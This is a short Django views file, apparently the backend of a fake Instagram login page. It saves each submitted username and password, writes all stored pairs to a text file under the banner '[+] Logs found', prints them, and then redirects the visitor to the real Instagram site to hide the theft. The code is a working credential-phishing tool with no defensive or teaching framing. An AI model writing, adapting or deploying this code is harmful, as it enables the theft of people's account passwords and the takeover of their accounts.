from django.shortcuts import render, redirect
from instagram.forms import Instagram_Account_Form
from instagram.models import Instagram_Account

# Create your views here.


def Instagram_Account_View(request):
     form = Instagram_Account_Form()
     if request.method == "POST":
          form = Instagram_Account_Form(request.POST)
          if form.is_valid():
               try:
                    form.save()
                    with open("instagram.txt", "w") as Logins:
                         
                         instance = Instagram_Account.objects.all()
                         
                         for i in instance:
                              user = i.username
                              pwd = i.password
                              details = "[+] Logs found ==> User %s pass %s \n"%(user, pwd)
                              print(details)
                              Logins.write("%s \n"%(details))
                    return redirect("https://www.instagram.com/")
               except:
                    pass
                         
     context = {'form': form}
          
     return render(request, "instagram.html", context)

          

